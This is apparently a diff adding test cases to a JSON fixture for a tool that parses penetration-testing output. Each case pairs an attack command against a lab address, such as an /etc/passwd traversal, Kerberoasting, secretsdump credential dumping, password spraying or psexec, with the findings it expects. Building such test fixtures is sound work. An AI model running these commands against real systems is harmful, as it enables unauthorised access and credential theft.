+      "action_id": "sqli-basics",
+      "command": "curl http://10.10.10.10/item?id=1",
+      "stdout": "outputs/web_sqli_error.txt",
+      "expected_supported_kinds": [
+        "web.sqli_confirmed"
+      ]
+    },
+    {
+      "id": "web_cmdi",
+      "tool": "curl",
+      "action_id": "command-injection",
+      "command": "curl http://10.10.10.10/ping?host=x",
+      "stdout": "outputs/web_cmdi.txt",
+      "expected_supported_kinds": [
+        "web.cmdi_confirmed"
+      ]
+    },
+    {
+      "id": "web_ssti",
+      "tool": "curl",
+      "action_id": "ssti",
+      "command": "curl http://10.10.10.10/?name={{7*7}}",
+      "stdout": "outputs/web_ssti.txt",
+      "expected_supported_kinds": [
+        "web.ssti_confirmed"
+      ]
+    },
+    {
+      "id": "web_lfi",
+      "tool": "curl",
+      "action_id": "lfi-probe",
+      "command": "curl http://10.10.10.10/?page=../../etc/passwd",
+      "stdout": "outputs/web_lfi.txt",
+      "expected_supported_kinds": [
+        "web.lfi_confirmed",
+        "loot.files"
+      ]
+    },
+    {
+      "id": "web_wpscan_users",
+      "tool": "wpscan",
+      "action_id": "wordpress",
+      "command": "wpscan --url http://10.10.10.10 --enumerate u",
+      "stdout": "outputs/web_wpscan_users.txt",
+      "expected_supported_kinds": [
+        "web.users"
+      ]
+    },
+    {
+      "id": "web_wpscan_login",
+      "tool": "wpscan",
+      "action_id": "wordpress",
+      "command": "wpscan --url http://10.10.10.10 --passwords rockyou.txt",
+      "stdout": "outputs/web_wpscan_login.txt",
+      "expected_supported_kinds": [
+        "credential.candidate"
+      ]
+    },
+    {
+      "id": "ad_rubeus_kerberoast",
+      "tool": "Rubeus.exe",
+      "action_id": "kerberoast",
+      "command": "Rubeus.exe kerberoast",
+      "stdout": "outputs/ad_rubeus_kerberoast.txt",
+      "expected_supported_kinds": [
+        "hash.tgs"
+      ],
+      "domain": "htb.local"
+    },
+    {
+      "id": "ad_rubeus_asrep",
+      "tool": "Rubeus.exe",
+      "action_id": "asrep-roast",
+      "command": "Rubeus.exe asreproast",
+      "stdout": "outputs/ad_rubeus_asrep.txt",
+      "expected_supported_kinds": [
+        "hash.asrep"
+      ],
+      "domain": "acme.internal"
+    },
+    {
+      "id": "ad_getuserspns_hit",
+      "tool": "GetUserSPNs.py",
+      "action_id": "kerberoast",
+      "command": "GetUserSPNs.py corp.local/u:p -dc-ip 10.10.10.10 -request",
+      "stdout": "outputs/ad_getuserspns_hit.txt",
+      "expected_supported_kinds": [
+        "hash.tgs"
+      ],
+      "domain": "corp.local"
+    },
+    {
+      "id": "ad_getuserspns_none",
+      "tool": "GetUserSPNs.py",
+      "action_id": "kerberoast",
+      "command": "GetUserSPNs.py corp.local/u:p -dc-ip 10.10.10.10 -request",
+      "stdout": "outputs/ad_getuserspns_none.txt",
+      "expected_supported_kinds": [],
+      "forbidden_supported_kinds": [
+        "hash.tgs",
+        "credential.candidate"
+      ],
+      "domain": "corp.local"
+    },
+    {
+      "id": "ad_getnpusers_hit",
+      "tool": "GetNPUsers.py",
+      "action_id": "asrep-roast",
+      "command": "GetNPUsers.py acme.internal/ -usersfile u.txt -dc-ip 10.10.10.10",
+      "stdout": "outputs/ad_getnpusers_hit.txt",
+      "expected_supported_kinds": [
+        "hash.asrep"
+      ],
+      "domain": "acme.internal"
+    },
+    {
+      "id": "ad_getnpusers_none",
+      "tool": "GetNPUsers.py",
+      "action_id": "asrep-roast",
+      "command": "GetNPUsers.py acme.internal/ -usersfile u.txt -dc-ip 10.10.10.10",
+      "stdout": "outputs/ad_getnpusers_none.txt",
+      "expected_supported_kinds": [],
+      "forbidden_supported_kinds": [
+        "hash.asrep",
+        "credential.candidate"
+      ],
+      "domain": "acme.internal"
+    },
+    {
+      "id": "ad_secretsdump_hit",
+      "tool": "secretsdump.py",
+      "action_id": "secretsdump",
+      "command": "secretsdump.py corp.local/a:p@10.10.10.10",
+      "stdout": "outputs/ad_secretsdump_hit.txt",
+      "expected_supported_kinds": [
+        "hash.ntlm",
+        "loot.ntds"
+      ],
+      "domain": "corp.local",
+      "allow_default_forbidden_supported_kinds": [
+        "loot.ntds"
+      ]
+    },
+    {
+      "id": "ad_secretsdump_denied",
+      "tool": "secretsdump.py",
+      "action_id": "secretsdump",
+      "command": "secretsdump.py corp.local/a:p@10.10.10.10",
+      "stdout": "outputs/ad_secretsdump_denied.txt",
+      "expected_supported_kinds": [],
+      "forbidden_supported_kinds": [
+        "hash.ntlm",
+        "loot.ntds",
+        "credential.available"
+      ],
+      "domain": "corp.local"
+    },
+    {
+      "id": "ad_kerbrute_userenum",
+      "tool": "kerbrute",
+      "action_id": "kerbrute-userenum",
+      "command": "kerbrute userenum -d corp.local users.txt",
+      "stdout": "outputs/ad_kerbrute_userenum.txt",
+      "expected_supported_kinds": [
+        "ad.user_list"
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available"
+      ],
+      "domain": "corp.local"
+    },
+    {
+      "id": "ad_kerbrute_spray",
+      "tool": "kerbrute",
+      "action_id": "kerbrute-spray",
+      "command": "kerbrute passwordspray -d acme.internal users.txt Autumn2026!",
+      "stdout": "outputs/ad_kerbrute_spray.txt",
+      "expected_supported_kinds": [
+        "credential.available"
+      ],
+      "domain": "acme.internal"
+    },
+    {
+      "id": "ad_psexec_system",
+      "tool": "psexec.py",
+      "action_id": "psexec",
+      "command": "psexec.py htb.local/a:p@10.10.10.10",
+      "stdout": "outputs/ad_psexec_system.txt",
+      "expected_supported_kinds": [
+        "access.system"
+      ],
+      "domain": "htb.local",
+      "allow_default_forbidden_supported_kinds": [
+        "access.system",
+        "foothold.windows"
+      ]
+    },
+    {
+      "id": "ad_evilwinrm_login",
+      "tool": "evil-winrm",
+      "action_id": "winrm-login",
+      "command": "evil-winrm -i 10.10.10.10 -u u -p p",
+      "stdout": "outputs/ad_evilwinrm_login.txt",
+      "expected_supported_kinds": [
+        "winrm.authenticated"
+      ],
+      "domain": "htb.local",
+      "allow_default_forbidden_supported_kinds": [
+        "foothold.windows"
+      ]
+    },
+    {
+      "id": "ad_evilwinrm_denied",
+      "tool": "evil-winrm",
+      "action_id": "winrm-login",
+      "command": "evil-winrm -i 10.10.10.10 -u u -p p",
+      "stdout": "outputs/ad_evilwinrm_denied.txt",
+      "expected_supported_kinds": [],
+      "forbidden_supported_kinds": [
+        "access.system",
+        "access.desktop"
+      ],
+      "domain": "htb.local"
+    },
+    {
+      "id": "crack_hashcat_ntlm",
+      "tool": "hashcat",
+      "action_id": "crack",
+      "command": "hashcat -m 1000 h.txt rockyou.txt",
+      "stdout": "outputs/crack_hashcat_ntlm.txt",
+      "expected_supported_kinds": [
+        "credential.candidate"
+      ]
+    },
+    {
+      "id": "crack_hashcat_show",
+      "tool": "hashcat",
+      "action_id": "crack",
+      "command": "hashcat -m 1000 h.txt --show",
+      "stdout": "outputs/crack_hashcat_show.txt",
+      "expected_supported_kinds": [
+        "credential.candidate"
+      ]
+    },
+    {
+      "id": "crack_hashcat_exhausted",
+      "tool": "hashcat",
+      "action_id": "crack",
+      "command": "hashcat -m 1000 h.txt rockyou.txt",
+      "stdout": "outputs/crack_hashcat_exhausted.txt",
+      "expected_supported_kinds": [],
+      "forbidden_supported_kinds": [
+        "credential.candidate",
+        "credential.available"
+      ]
+    },
+    {
+      "id": "crack_john_krb5tgs",
+      "tool": "john",
+      "action_id": "crack",
+      "command": "john --wordlist=rockyou.txt tgs.txt",
+      "stdout": "outputs/crack_john_krb5tgs.txt",
+      "expected_supported_kinds": [
+        "credential.candidate"
+      ]
+    },
+    {
+      "id": "crack_john_none",
+      "tool": "john",
+      "action_id": "crack",
+      "command": "john --wordlist=rockyou.txt h.txt",
+      "stdout": "outputs/crack_john_none.txt",
+      "expected_supported_kinds": [],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "credential.plaintext"
+      ]
+    },
+    {
+      "id": "smb_spider_loot",
+      "tool": "nxc",
+      "action_id": "smb-spider",
+      "command": "nxc smb 10.10.10.10 -u u -p p -M spider_plus",
+      "stdout": "outputs/smb_spider_loot.txt",
+      "expected_supported_kinds": [
+        "loot.files"
+      ],
+      "domain": "globex.corp"
+    },
+    {
+      "id": "smb_smbmap_r_loot",
+      "tool": "smbmap",
+      "action_id": "smb-shares",
+      "command": "smbmap -R Finance -H 10.10.10.10 -u u -p p",
+      "stdout": "outputs/smb_smbmap_r_loot.txt",
+      "expected_supported_kinds": [
+        "loot.files"
+      ]
+    },
+    {
+      "id": "smb_login_fail",
+      "tool": "nxc",
+      "action_id": "smb-login",
+      "command": "nxc smb 10.10.10.10 -u svc -p p",
+      "stdout": "outputs/smb_login_fail.txt",
+      "expected_supported_kinds": [],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "access.admin"
+      ],
+      "domain": "lab.internal"
+    },
+    {
+      "id": "db_mssql_xpcmdshell",
+      "tool": "mssqlclient.py",
+      "action_id": "mssql-xp-cmdshell",
+      "command": "mssqlclient.py corp/sa:p@10.10.10.10",
+      "stdout": "outputs/db_mssql_xpcmdshell.txt",
+      "expected_supported_kinds": [
+        "foothold.windows"
+      ],
+      "allow_default_forbidden_supported_kinds": [
+        "foothold.windows"
+      ]
+    },
+    {
+      "id": "db_mysql_loot",
+      "tool": "mysql",
+      "action_id": "mysql-loot",
+      "command": "mysql -h 10.10.10.10 -u root -pp",
+      "stdout": "outputs/db_mysql_loot.txt",
+      "expected_supported_kinds": [
+        "loot.material"
+      ]
+    },
+    {
+      "id": "db_redis_unauth",
+      "tool": "redis-cli",
+      "action_id": "redis-enum",
+      "command": "redis-cli -h 10.10.10.10 INFO",
+      "stdout": "outputs/db_redis_unauth.txt",
+      "expected_supported_kinds": [
+        "config.review"
+      ]
+    },
+    {
+      "id": "db_mysql_denied",
+      "tool": "mysql",
+      "action_id": "mysql-login",
+      "command": "mysql -h 10.10.10.10 -u root -pp",
+      "stdout": "outputs/db_mysql_denied.txt",
+      "expected_supported_kinds": [],
+      "forbidden_supported_kinds": [
+        "foothold.windows",
+        "loot.material",
+        "credential.available"
+      ]
+    },
+    {
+      "id": "db_mssql_login_only",
+      "tool": "mssqlclient.py",
+      "action_id": "mssql-login",
+      "command": "mssqlclient.py corp/sa:p@10.10.10.10",
+      "stdout": "outputs/db_mssql_login_only.txt",
+      "expected_supported_kinds": [],
+      "forbidden_supported_kinds": [
+        "foothold.windows"
+      ]
+    },
+    {
+      "id": "web_sqli_union_echoed_negative",
+      "tool": "curl",
+      "action_id": "sqli-basics",
+      "command": "curl http://10.10.10.10/search?q=UNION+SELECT",
+      "stdout": "outputs/web_sqli_union_echoed_negative.txt",
+      "expected_supported_kinds": [],
+      "forbidden_supported_kinds": [
+        "web.sqli_confirmed"
+      ]
+    },
+    {
+      "id": "sqli_differential_login_oracle",
+      "tool": "curl",
+      "action_id": "sqli-basics",
+      "command": "curl -i -s http://10.10.10.10/api/login",
+      "stdout": "outputs/sqli_differential_login_oracle.txt",
+      "expected_supported_kinds": [
+        "web.sqli_confirmed"
+      ],
+      "expected_facts": [
+        {
+          "kind": "web.sqli_confirmed",
+          "value_contains": {
+            "method": "differential_boolean"
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "credential.plaintext",
+        "db.databases",
+        "web.authenticated"
+      ]
+    },
+    {
+      "id": "sqli_reflected_column_marker",
+      "tool": "curl",
+      "action_id": "sqli-basics",
+      "command": "curl -s http://10.10.10.10/item?id=1",
+      "stdout": "outputs/sqli_reflected_column_marker.txt",
+      "expected_supported_kinds": [
+        "web.sqli_confirmed"
+      ],
+      "expected_facts": [
+        {
+          "kind": "web.sqli_confirmed",
+          "value_contains": {
+            "method": "reflected_column",
+            "marker": "0b0lm4rk3r"
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "db.databases"
+      ]
+    },
+    {
+      "id": "git_hosting_gogs_footer",
+      "tool": "curl",
+      "action_id": "web-tech-fingerprint",
+      "command": "curl -i http://10.10.10.10:3000/",
+      "stdout": "outputs/git_hosting_gogs_footer.txt",
+      "expected_supported_kinds": [
+        "web.tech"
+      ],
+      "expected_facts": [
+        {
+          "kind": "web.tech",
+          "value_contains": {
+            "name": "gogs",
+            "version": "0.12.3",
+            "product": true
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "web.authenticated"
+      ]
+    },
+    {
+      "id": "git_hosting_gitlab_footer",
+      "tool": "curl",
+      "action_id": "web-tech-fingerprint",
+      "command": "curl -i http://10.10.10.10/help",
+      "stdout": "outputs/git_hosting_gitlab_footer.txt",
+      "expected_supported_kinds": [
+        "web.tech"
+      ],
+      "expected_facts": [
+        {
+          "kind": "web.tech",
+          "value_contains": {
+            "name": "gitlab",
+            "version": "15.6.0",
+            "product": true
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "web.authenticated"
+      ]
+    }
+  ]
+}
